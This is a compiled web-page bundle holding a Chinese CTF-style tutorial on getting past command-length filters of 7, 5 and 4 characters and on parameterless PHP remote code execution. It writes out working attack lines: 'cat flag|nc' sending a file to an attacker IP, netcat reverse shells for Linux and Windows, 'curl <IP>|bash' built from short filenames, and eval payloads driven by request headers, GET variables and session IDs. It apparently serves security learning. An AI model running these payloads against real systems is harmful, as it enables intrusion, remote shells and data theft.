`)]),o(`button`,{class:`code-block-unfold-btn`})],-1),o(`blockquote`,null,[o(`p`,null,`对命令长度有限制时`),o(`p`,null,`把一些很短的文件名拼接成可执行命令`),o(`p`,null,`>创建很短的的文件名`),o(`p`,null,`ls -t按时间顺序列出文件名，按行储存`),o(`p`,null,`\\连接换行命令`),o(`p`,null,`sh从文件中读取命令`)],-1),o(`h5`,{id:`_5-dir及-和rev`,tabindex:`-1`},[o(`strong`,null,`5.dir及*和rev`),s(),o(`a`,{class:`header-anchor`,href:`#_5-dir及-和rev`,"aria-label":`Permalink to "**5.dir及*和rev**"`},`​`)],-1),o(`p`,null,[o(`strong`,null,`dir`),s(`：基本上和ls一样，但有两个好处`)],-1),o(`p`,null,`一是开头字母是d，这使得它在alphabetical序中靠前；`,-1),o(`p`,null,`二是按列输出，不换行`,-1),o(`p`,null,`*****:相当于$(dir *)`,-1),o(`p`,null,`把文件名组合在一起当作命令执行`,-1),o(`figure`,null,[o(`img`,{src:`https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202404251436045.png`,alt:`image-20240425143604984`,loading:`lazy`,decoding:`async`})],-1),o(`p`,null,[o(`strong`,null,`rev`),s(`：可以反转文件的每一行内容`)],-1),o(`div`,{class:`language-`},[o(`button`,{title:`Copy code`,class:`copy`}),o(`span`,{class:`lang`}),o(`pre`,null,[o(`code`,null,`cat flag
123456

rev flag
654321
`)]),o(`button`,{class:`code-block-unfold-btn`})],-1),o(`hr`,null,null,-1),o(`h4`,{id:`长度限制为7的绕过方法`,tabindex:`-1`},[s(`长度限制为7的绕过方法 `),o(`a`,{class:`header-anchor`,href:`#长度限制为7的绕过方法`,"aria-label":`Permalink to "长度限制为7的绕过方法"`},`​`)],-1),o(`figure`,null,[o(`img`,{src:`https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202404251500945.png`,alt:`image-20240425150059857`,loading:`lazy`,decoding:`async`})],-1),o(`p`,null,`思路：1.先寻找期望执行的命令`,-1),o(`div`,{class:`language-`},[o(`button`,{title:`Copy code`,class:`copy`}),o(`span`,{class:`lang`}),o(`pre`,null,[o(`code`,null,`cat flag|nc 192.168.1.161 7777
`)]),o(`button`,{class:`code-block-unfold-btn`})],-1),o(`p`,null,`kail的ip地址192.168.1.161`,-1),o(`p`,null,`监听端口7777`,-1),o(`div`,{class:`language-`},[o(`button`,{title:`Copy code`,class:`copy`}),o(`span`,{class:`lang`}),o(`pre`,null,[o(`code`,null,`方法
nc -lvp 7777
`)]),o(`button`,{class:`code-block-unfold-btn`})],-1),o(`p`,null,`通过cat flag展示内容，再通过nc反弹，提交到192.168.1.161:777，最后通过监听端口获得内容`,-1),o(`p`,null,`用以下方法进行拼接`,-1),o(`blockquote`,null,[o(`p`,null,`>创建很短的的文件名`),o(`p`,null,`ls -t按时间顺序列出文件名，按行储存`),o(`p`,null,`\\连接换行命令`),o(`p`,null,`sh从文件中读取命令`)],-1),o(`figure`,null,[o(`img`,{src:`https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202404251506528.png`,alt:`image-20240425150646487`,loading:`lazy`,decoding:`async`})],-1),o(`p`,null,`最后用sh a执行命令`,-1),o(`p`,null,[o(`strong`,null,`nc反弹shell`)],-1),o(`p`,null,[o(`strong`,null,`在 Kali Linux 上监听连接`)],-1),o(`div`,{class:`language-`},[o(`button`,{title:`Copy code`,class:`copy`}),o(`span`,{class:`lang`}),o(`pre`,null,[o(`code`,null,`nc -lvp <监听端口>
`)]),o(`button`,{class:`code-block-unfold-btn`})],-1),o(`p`,null,[o(`strong`,null,`在目标主机上发起连接请求`)],-1),o(`p`,null,`linux`,-1),o(`div`,{class:`language-`},[o(`button`,{title:`Copy code`,class:`copy`}),o(`span`,{class:`lang`}),o(`pre`,null,[o(`code`,null,`nc -e /bin/bash <kali的IP> <kali监听端口>
`)]),o(`button`,{class:`code-block-unfold-btn`})],-1),o(`p`,null,`windows`,-1),o(`div`,{class:`language-`},[o(`button`,{title:`Copy code`,class:`copy`}),o(`span`,{class:`lang`}),o(`pre`,null,[o(`code`,null,`nc -e cmd.exe <kali的IP> <kali监听端口>
`)]),o(`button`,{class:`code-block-unfold-btn`})],-1),o(`hr`,null,null,-1),o(`h4`,{id:`长度限制为5的绕过方法`,tabindex:`-1`},[s(`长度限制为5的绕过方法 `),o(`a`,{class:`header-anchor`,href:`#长度限制为5的绕过方法`,"aria-label":`Permalink to "长度限制为5的绕过方法"`},`​`)],-1),o(`figure`,null,[o(`img`,{src:`https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202405071406094.png`,alt:`image-20240507140631920`,loading:`lazy`,decoding:`async`})],-1),o(`div`,{class:`language-`},[o(`button`,{title:`Copy code`,class:`copy`}),o(`span`,{class:`lang`}),o(`pre`,null,[o(`code`,null,`ls -t>a
字符串长度为7，超过限制5

>\\ \\\\
构造空格的字符串长度最少为5，超过一个空格便无法构造

长度限制为7时的命令不再适用
`)]),o(`button`,{class:`code-block-unfold-btn`})],-1),o(`figure`,null,[o(`img`,{src:`https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202404271923282.png`,alt:`image-20240427192327068`,loading:`lazy`,decoding:`async`})],-1),o(`p`,null,[o(`strong`,null,`构建命令`)],-1),o(`div`,{class:`language-`},[o(`button`,{title:`Copy code`,class:`copy`}),o(`span`,{class:`lang`}),o(`pre`,null,[o(`code`,null,`期望执行的命令
curl 192.168.1.161|bash
`)]),o(`button`,{class:`code-block-unfold-btn`})],-1),o(`p`,null,[o(`strong`,null,`步骤一`),s(`：构造ls-t>y`)],-1),o(`p`,null,`ls默认排序无法正常排出“ls\\”“"”-t"">y"`,-1),o(`p`,null,`"ls"默认会排在最后，无法正常执行命令的`,-1),o(`p`,null,`所以：我们先创建文件ls\\`,-1),o(`div`,{class:`language-`},[o(`button`,{title:`Copy code`,class:`copy`}),o(`span`,{class:`lang`}),o(`pre`,null,[o(`code`,null,`>ls\\
`)]),o(`button`,{class:`code-block-unfold-btn`})],-1),o(`p`,null,`在创建文件"_"，并把“ls\\”写入`,-1),o(`div`,{class:`language-`},[o(`button`,{title:`Copy code`,class:`copy`}),o(`span`,{class:`lang`}),o(`pre`,null,[o(`code`,null,`ls>_
`)]),o(`button`,{class:`code-block-unfold-btn`})],-1),o(`p`,null,`再创建其他文件`,-1),o(`div`,{class:`language-`},[o(`button`,{title:`Copy code`,class:`copy`}),o(`span`,{class:`lang`}),o(`pre`,null,[o(`code`,null,`>\\ \\\\
>-t\\\\
>\\>y
`)]),o(`button`,{class:`code-block-unfold-btn`})],-1),o(`p`,null,`用>>把所有文件名追加到文件_`,-1),o(`div`,{class:`language-`},[o(`button`,{title:`Copy code`,class:`copy`}),o(`span`,{class:`lang`}),o(`pre`,null,[o(`code`,null,`ls>>_
`)]),o(`button`,{class:`code-block-unfold-btn`})],-1),o(`p`,null,`最后sh_执行文件_中的内容，即创建文件y`,-1),o(`div`,{class:`language-`},[o(`button`,{title:`Copy code`,class:`copy`}),o(`span`,{class:`lang`}),o(`pre`,null,[o(`code`,null,`sh_
`)]),o(`button`,{class:`code-block-unfold-btn`})],-1),o(`p`,null,`**步骤二：**分解命令，创建文件`,-1),o(`figure`,null,[o(`img`,{src:`https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202404271953465.png`,alt:`image-20240427195355410`,loading:`lazy`,decoding:`async`})],-1),o(`p`,null,[o(`strong`,null,`步骤三`),s(`：执行脚本sh`)],-1),o(`div`,{class:`language-`},[o(`button`,{title:`Copy code`,class:`copy`}),o(`span`,{class:`lang`}),o(`pre`,null,[o(`code`,null,`sh y
`)]),o(`button`,{class:`code-block-unfold-btn`})],-1),o(`p`,null,`执行命令curl 192.168.1.161|bash`,-1),o(`p`,null,`反弹shell`,-1),o(`figure`,null,[o(`img`,{src:`https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202404272001638.png`,alt:`image-20240427200103558`,loading:`lazy`,decoding:`async`})],-1),o(`hr`,null,null,-1),o(`h4`,{id:`长度限制为4的绕过方法`,tabindex:`-1`},[s(`长度限制为4的绕过方法 `),o(`a`,{class:`header-anchor`,href:`#长度限制为4的绕过方法`,"aria-label":`Permalink to "长度限制为4的绕过方法"`},`​`)],-1),o(`div`,{class:`language-`},[o(`button`,{title:`Copy code`,class:`copy`}),o(`span`,{class:`lang`}),o(`pre`,null,[o(`code`,null,`ls>>_
追加命令长度最少为5，超过4个，不再适用
`)]),o(`button`,{class:`code-block-unfold-btn`})],-1),o(`figure`,null,[o(`img`,{src:`https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202405071410666.png`,alt:`image-20240507141056579`,loading:`lazy`,decoding:`async`})],-1),o(`p`,null,`步骤一：构造ls -t>g`,-1),o(`div`,{class:`language-`},[o(`button`,{title:`Copy code`,class:`copy`}),o(`span`,{class:`lang`}),o(`pre`,null,[o(`code`,null,`>g\\;
>g\\>
>ht-
>sl
>dir
*>v
>rev
*v>x

`)]),o(`button`,{class:`code-block-unfold-btn`})],-1),o(`p`,null,`步骤二：构造一个反弹的shell`,-1),o(`p`,null,`ip地址用16进制表示`,-1),o(`div`,{class:`language-`},[o(`button`,{title:`Copy code`,class:`copy`}),o(`span`,{class:`lang`}),o(`pre`,null,[o(`code`,null,`>ash
>b\\
>\\|\\
>A1\\
>01\\
>A8\\
>c0>
>0x\\
>\\\\
>rl\\
>cu\\
sh x
sh g

`)]),o(`button`,{class:`code-block-unfold-btn`})],-1),o(`p`,null,`步骤三：开启http.server监听80端口`,-1),o(`div`,{class:`language-`},[o(`button`,{title:`Copy code`,class:`copy`}),o(`span`,{class:`lang`}),o(`pre`,null,[o(`code`,null,`#python -m http.server 80
`)]),o(`button`,{class:`code-block-unfold-btn`})],-1),o(`p`,null,`步骤四：执行脚本`,-1),o(`div`,{class:`language-`},[o(`button`,{title:`Copy code`,class:`copy`}),o(`span`,{class:`lang`}),o(`pre`,null,[o(`code`,null,`#python poc4.py
`)]),o(`button`,{class:`code-block-unfold-btn`})],-1),o(`h3`,{id:`无参数命令执行请求头绕过`,tabindex:`-1`},[s(`无参数命令执行请求头绕过 `),o(`a`,{class:`header-anchor`,href:`#无参数命令执行请求头绕过`,"aria-label":`Permalink to "无参数命令执行请求头绕过"`},`​`)],-1),o(`figure`,null,[o(`img`,{src:`https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202405071943478.png`,alt:`image-20240507194352410`,loading:`lazy`,decoding:`async`})],-1),o(`div`,{class:`language-`},[o(`button`,{title:`Copy code`,class:`copy`}),o(`span`,{class:`lang`}),o(`pre`,null,[o(`code`,null,` preg_replace('/[^\\W]+\\((?R)?\\)/', $_GET['exp'])
只要在exp里匹配到[^\\W]+\\((?R)?\\) 则替换为空

[^\\W]+\\((?R)?\\)
正则表达式[^\\W]匹配字母、数字、下划线（如果在方括号的前面写上一个^,则代表要求匹配出了尖号后面列出的以外的字符）
[^\\W]+\\(?\\)匹配到‘a()’形式的字符串，但是（）不能出现任何参数
(?R)代表递归，即a(b(c()))都能匹配到
`)]),o(`button`,{class:`code-block-unfold-btn`})],-1),o(`p`,null,[o(`strong`,null,`HTTP请求标头`)],-1),o(`p`,null,[o(`strong`,null,`getallheaders()`)],-1),o(`p`,null,`获取所有请求标头(跟抓包内容是反着的)`,-1),o(`div`,{class:`language-`},[o(`button`,{title:`Copy code`,class:`copy`}),o(`span`,{class:`lang`}),o(`pre`,null,[o(`code`,null,`?code=print_r(getallheaders());
`)]),o(`button`,{class:`code-block-unfold-btn`})],-1),o(`figure`,null,[o(`img`,{src:`https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202405072009305.png`,alt:`image-20240507200954233`,loading:`lazy`,decoding:`async`})],-1),o(`p`,null,`pos()把第一项内容的值显示出来`,-1),o(`p`,null,`或end()把最后一项内容的值显示出来`,-1),o(`div`,{class:`language-`},[o(`button`,{title:`Copy code`,class:`copy`}),o(`span`,{class:`lang`}),o(`pre`,null,[o(`code`,null,`?code=print_r(pos(getallheaders())); pos拿到的的getallheaders显示的第一个
?code=print_r(end(getallheaders())); end拿到的的getallheaders显示的最后一个
`)]),o(`button`,{class:`code-block-unfold-btn`})],-1),o(`p`,null,`把print_r改为eval就能执行命令了`,-1),o(`p`,null,[o(`strong`,null,`apache_request_headers()`)],-1),o(`p`,null,`功能与getallheaders()相似，适用于apache服务器`,-1),o(`hr`,null,null,-1),o(`h3`,{id:`无参数全局变量rce`,tabindex:`-1`},[s(`无参数全局变量RCE `),o(`a`,{class:`header-anchor`,href:`#无参数全局变量rce`,"aria-label":`Permalink to "无参数全局变量RCE"`},`​`)],-1),o(`p`,null,`get_defined_vars()`,-1),o(`p`,null,`返回所有已定义变量的值所组成的数组`,-1),o(`div`,{class:`language-`},[o(`button`,{title:`Copy code`,class:`copy`}),o(`span`,{class:`lang`}),o(`pre`,null,[o(`code`,null,`?code=print_r(get_defined_vars));
返回数组顺序为GET->POST->COOKIE->FILES
?code=print_r(end(pos(get_defined_vars())));&cmd=system('ls');
&加入想要获取的命令
把print_r换成eval，assert即可
end获取GET的最后一项cmd的值system('ls')
`)]),o(`button`,{class:`code-block-unfold-btn`})],-1),o(`div`,{class:`language-`},[o(`button`,{title:`Copy code`,class:`copy`}),o(`span`,{class:`lang`}),o(`pre`,null,[o(`code`,null,`var_dump(scandir(current(localeconv())));

查看当前目录下的文件

localeconv() 函数返回当前设置的地区的格式化信息，包括货币符号、小数点符号等。它返回一个数组，其中包含了与当前地区相关的格式化参数，该函数返回的第一个元素的值通常是小数点 “.” 。

current() 函数用于获取数组中的当前元素的值。在这里，它用于获取 localeconv() 函数返回的数组的第一个元素的值，即一个小数点。

scandir() 函数用于获取指定目录中的文件和文件夹列表。它接受一个路径作为参数，并返回一个包含指定目录中所有文件和文件夹的数组。scandir(".") 表示获取当前目录下的文件列表。

最后使用 var_dump() 函数将该列表输出到页面上。
`)]),o(`button`,{class:`code-block-unfold-btn`})],-1),o(`h3`,{id:`无参数命令执行session`,tabindex:`-1`},[s(`无参数命令执行session `),o(`a`,{class:`header-anchor`,href:`#无参数命令执行session`,"aria-label":`Permalink to "无参数命令执行session"`},`​`)],-1),o(`p`,null,`使用条件：php7以下`,-1),o(`p`,null,`session_start()`,-1),o(`p`,null,`启动新会话或者重用现有会话，成功开始会话返回true，反之返回false`,-1),o(`div`,{class:`language-`},[o(`button`,{title:`Copy code`,class:`copy`}),o(`span`,{class:`lang`}),o(`pre`,null,[o(`code`,null,`?code=print_r(session_start());

返回1

?code=print_r(session_id(session_start()))
返回PHPSESSID的值
可以通过bp修改它
`)]),o(`button`,{class:`code-block-unfold-btn`})],-1),o(`p`,null,`print_r修改为show_source(session_id(session_start))`,-1),o(`p`,null,`用show_source读取flag文件源代码`,-1),o(`p`,null,`修改外部函数为eval()`,-1),o(`p`,null,`修改PHPSESSID为‘phpinfo();’`,-1),o(`p`,null,`但无法直接执行，需要把phpinfo();改为hex编码后再用hex2bin()函数将16进制转为2进制，才可用eval执行`,-1)]]),"main-header":c(()=>[n(e.$slots,`main-header`)]),"main-header-after":c(()=>[n(e.$slots,`main-header-after`)]),"main-nav":c(()=>[n(e.$slots,`main-nav`)]),"main-content-before":c(()=>[n(e.$slots,`main-content-before`)]),"main-content":c(()=>[n(e.$slots,`main-content`)]),"main-content-after":c(()=>[n(e.$slots,`main-content-after`)]),"main-nav-before":c(()=>[n(e.$slots,`main-nav-before`)]),"main-nav-after":c(()=>[n(e.$slots,`main-nav-after`)]),comment:c(()=>[n(e.$slots,`comment`)]),footer:c(()=>[n(e.$slots,`footer`)]),aside:c(()=>[n(e.$slots,`aside`)]),"aside-custom":c(()=>[n(e.$slots,`aside-custom`)]),default:c(()=>[n(e.$slots,`default`)]),_:3},8,[`frontmatter`])}}};export{f as default};